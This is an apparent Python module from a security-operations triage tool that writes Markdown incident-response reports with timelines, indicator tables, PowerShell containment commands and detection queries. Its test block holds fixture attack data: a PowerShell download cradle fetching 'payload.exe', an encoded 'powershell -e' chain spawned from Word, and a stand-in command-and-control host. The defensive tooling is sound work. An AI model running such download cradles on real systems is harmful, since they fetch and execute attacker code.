#!/usr/bin/env python3
"""
paste_engine – Automated IR Incident Reporting (Phase 4)
========================================================
Generates structured, executive-ready Incident Response briefs
(IR_REPORT_<alert_id>.md) containing executive summaries, causal execution
timelines, IOC tables, automated containment runbooks, and compiled SIEM queries.
"""

from __future__ import annotations

import os
import re
from datetime import datetime, timezone
from typing import Any

from triage import AlertTriageReport


def _basename(path: str) -> str:
    """Return lower-cased filename from Windows or POSIX path."""
    if not path:
        return ""
    clean = path.replace("\\", "/").rstrip("/")
    return clean.split("/")[-1].lower()


def generate_incident_brief(
    triage_report: AlertTriageReport,
    graph_data: dict[str, Any],
    sigma_rule_path: str,
    splunk_query: str | list[str],
    kql_query: str | list[str],
    output_dir: str = "paste_engine/reports",
) -> str:
    """
    Generate an authoritative Incident Response Markdown brief.

    Args:
        triage_report: Pydantic AlertTriageReport instance.
        graph_data: Subgraph dictionary containing chain_nodes.
        sigma_rule_path: Path to generated Sigma YAML rule.
        splunk_query: Compiled Splunk query string or list.
        kql_query: Compiled Sentinel KQL query string or list.
        output_dir: Target directory for the report.

    Returns:
        The absolute path to the generated incident brief.
    """
    os.makedirs(output_dir, exist_ok=True)
    report_filename = f"IR_REPORT_{triage_report.alert_id}.md"
    report_path = os.path.join(output_dir, report_filename)

    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # Format queries
    splunk_str = splunk_query[0] if isinstance(splunk_query, list) and splunk_query else str(splunk_query)
    kql_str = kql_query[0] if isinstance(kql_query, list) and kql_query else str(kql_query)

    # Load raw Sigma rule if file exists
    sigma_content = ""
    if os.path.isfile(sigma_rule_path):
        with open(sigma_rule_path, "r", encoding="utf-8") as fh:
            sigma_content = fh.read().strip()

    # Sort chain nodes chronologically for the timeline
    chain_nodes = list(graph_data.get("chain_nodes", []))

    def _get_timestamp(node: dict) -> str:
        return str(node.get("UtcTime", "9999-99-99 99:99:99"))

    chain_nodes.sort(key=_get_timestamp)

    # Build Causal Execution Timeline Table
    timeline_rows = []
    suspicious_pids = []
    c2_ips = []

    for node in chain_nodes:
        node_type = node.get("node_type", "Process")
        time_str = node.get("UtcTime", "N/A")

        if node_type == "NetworkSocket":
            dest_ip = node.get("destination_ip", "")
            dest_port = node.get("destination_port", "")
            proto = node.get("protocol", "TCP").upper()
            host = node.get("hostname", "")
            host_disp = f" ({host})" if host else ""
            desc = f"Outbound socket established to {dest_ip}:{dest_port}{host_disp}"
            timeline_rows.append(f"| `{time_str}` | `NetworkSocket` | — | {desc} | **CRITICAL** |")
            if dest_ip and dest_ip not in c2_ips:
                c2_ips.append(dest_ip)
        else:
            img = _basename(node.get("Image", ""))
            pid = node.get("ProcessId", 0)
            cmd = node.get("CommandLine", "")
            decoded = node.get("DecodedPayload", "")

            if pid and pid not in suspicious_pids:
                suspicious_pids.append(pid)

            if decoded:
                action = f"Executed de-obfuscated payload: `{decoded}`"
                risk = "**CRITICAL**"
            elif img in ("cmd.exe", "powershell.exe", "pwsh.exe"):
                action = f"Living-off-the-Land interpreter spawned (`{cmd[:80]}...`)"
                risk = "**HIGH**"
            elif img == "whoami.exe":
                action = f"Host reconnaissance discovery: `{cmd}`"
                risk = "**HIGH**"
            else:
                action = f"Process spawned document/payload: `{cmd[:80]}`"
                risk = "SUSPICIOUS"

            timeline_rows.append(f"| `{time_str}` | `{img}` | `{pid}` | {action} | {risk} |")

    timeline_table = "\n".join(timeline_rows) if timeline_rows else "| N/A | No events recorded | — | — | — |"

    # Build IOC Table
    ioc_rows = []
    # IPs & Domains
    for ip in c2_ips:
        ioc_rows.append(f"| IPv4 Address | `{ip}` | Command & Control Destination | High |")
    for host in triage_report.network_indicators:
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
            ioc_rows.append(f"| Domain / Host | `{host}` | C2 External Destination Hostname | High |")

    # Staging URLs & Payloads
    decoded_cmd = triage_report.decoded_command
    if decoded_cmd:
        url_match = re.search(r"https?://[^\s\"']+", decoded_cmd)
        if url_match:
            ioc_rows.append(f"| Staging URL | `{url_match.group(0)}` | Download Cradle Target URI | Critical |")
        ioc_rows.append(f"| Decoded Payload | `{decoded_cmd[:100]}` | De-obfuscated PowerShell cradle | Critical |")

    ioc_table = "\n".join(ioc_rows) if ioc_rows else "| Telemetry | None | No external IOCs detected | Low |"

    # Build Threat Intelligence Table
    intel_dict = triage_report.threat_intel or graph_data.get("threat_intel", {})
    intel_rows = []
    if intel_dict:
        for ip, intel in intel_dict.items():
            isp = intel.get("isp", "Unknown")
            country = intel.get("country", "Unknown")
            classification = intel.get("threat_classification", "Unclassified")
            abuse = intel.get("abuse_confidence_score", 0)
            score_disp = f"**{abuse}%**" if abuse >= 75 else f"{abuse}%"
            intel_rows.append(f"| `{ip}` | {isp} | {country} | {classification} | {score_disp} |")
    elif c2_ips:
        for ip in c2_ips:
            intel_rows.append(f"| `{ip}` | Unenriched External Host | Unknown | Potential Command & Control | Low |")

    intel_table = "\n".join(intel_rows) if intel_rows else "| None | No external indicators observed | — | — | — |"

    # Build Containment Scripts
    pid_terminations = "\n".join([f"Stop-Process -Id {p} -Force   # Terminate PID {p}" for p in suspicious_pids])
    firewall_blocks = "\n".join([
        f'New-NetFirewallRule -DisplayName "PASTE-Block-{ip}" -Direction Outbound -RemoteAddress {ip} -Action Block'
        for ip in c2_ips
    ])
    if not firewall_blocks:
        firewall_blocks = "# No external network IP detected for firewall blocking."

    # Construct full Markdown document
    markdown_content = f"""# Incident Response Brief: {triage_report.alert_id}

**Classification:** STRICTLY CONFIDENTIAL // SOC INCIDENT RESPONSE  
**Generated By:** PASTE Autonomous Detection Engine  
**Analysis Timestamp:** {now_utc}  

---

## 1. Executive Summary

| Attribute | Assessment Value |
|---|---|
| **Alert ID** | `{triage_report.alert_id}` |
| **Verdict** | **`{triage_report.verdict}`** |
| **Confidence Score** | `{triage_report.confidence_score:.0%}` |
| **Primary MITRE Technique** | `{triage_report.mitre_technique_id}` – {triage_report.technique_name} |
| **Root Cause Process** | `{triage_report.root_cause_process}` |
| **First Malicious Child** | `{triage_report.malicious_child_process}` |
| **Network Egress** | {", ".join(triage_report.network_indicators) if triage_report.network_indicators else "None"} |

### Assessment Summary
{triage_report.explanation}

**Recommended Immediate Action:**  
> {triage_report.recommended_action}

---

## 2. Causal Execution Timeline

Chronological reconstruction derived from multi-telemetry provenance DAG:

| Event Time (UTC) | Entity / Component | PID | Executed Action / Socket | Threat Level |
|---|---|---|---|---|
{timeline_table}

---

## 3. Indicators of Compromise (IOCs)

| IOC Type | Indicator | Context / Description | Threat Severity |
|---|---|---|---|
{ioc_table}

---

## 4. OSINT Threat Intelligence Enrichment

| Indicator (IP) | Autonomous System / ISP | Geolocation Country | Threat Classification | Abuse Confidence |
|---|---|---|---|---|
{intel_table}

---

## 5. Automated Containment Runbook

The following PowerShell commands should be executed immediately by Incident Responders:

### A. Terminate Malicious Process Tree
```powershell
# Terminate malicious lineage discovered by PASTE
{pid_terminations}
```

### B. Block Command & Control Egress
```powershell
# Deploy host-level firewall block rules
{firewall_blocks}
```

### C. Host Quarantine (Optional)
```powershell
# Isolate host while maintaining management plane
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

---

## 6. Detection-as-Code Artifacts

### A. Synthesized Sigma Rule
**Rule File:** `{sigma_rule_path}`
```yaml
{sigma_content}
```

### B. Compiled Splunk SPL Query
```spl
{splunk_str}
```

### C. Compiled Microsoft Sentinel KQL Query
```kql
{kql_str}
```

---
*Report generated autonomously by PASTE (Provenance-Augmented SOC Triage Engine).*
"""

    with open(report_path, "w", encoding="utf-8") as fh:
        fh.write(markdown_content)

    return os.path.abspath(report_path)


if __name__ == "__main__":
    from triage import AlertTriageReport
    dummy_report = AlertTriageReport(
        alert_id="PASTE-TEST01",
        root_cause_process="winword.exe",
        malicious_child_process="cmd.exe",
        decoded_command="Invoke-WebRequest -Uri http://192.168.1.50/payload.exe",
        verdict="MALICIOUS",
        confidence_score=0.95,
        mitre_technique_id="T1059.001",
        technique_name="Command and Scripting Interpreter: PowerShell",
        explanation="Word spawned cmd which executed an encoded payload.",
        network_indicators=["198.51.100.42", "update-telemetry-check.com"],
        threat_intel={
            "198.51.100.42": {
                "isp": "FlyServers S.A. / Bulletproof VPS Hosting",
                "country": "Netherlands (NL)",
                "threat_classification": "Known Cobalt Strike C2 / Bulletproof Hosting",
                "abuse_confidence_score": 100,
            }
        },
        recommended_action="Isolate host immediately.",
    )
    dummy_data = {
        "chain_nodes": [
            {"UtcTime": "2026-11-09 09:15:22", "Image": "winword.exe", "ProcessId": 5560, "CommandLine": "winword.exe doc.docx"},
            {"UtcTime": "2026-11-09 09:15:33", "Image": "cmd.exe", "ProcessId": 8844, "CommandLine": "cmd.exe /c powershell -e ..."},
            {"UtcTime": "2026-11-09 09:15:34", "Image": "powershell.exe", "ProcessId": 9916, "CommandLine": "powershell -e ...", "DecodedPayload": "Invoke-WebRequest -Uri http://192.168.1.50/payload.exe"},
            {"UtcTime": "2026-11-09 09:15:36", "node_type": "NetworkSocket", "destination_ip": "198.51.100.42", "destination_port": 443, "protocol": "tcp", "hostname": "update-telemetry-check.com"},
        ]
    }
    path = generate_incident_brief(dummy_report, dummy_data, "paste_engine/rules/sigma_auto_rule.yml", "test splunk", "test kql")
    print(f"[+] Incident brief generated: {path}")
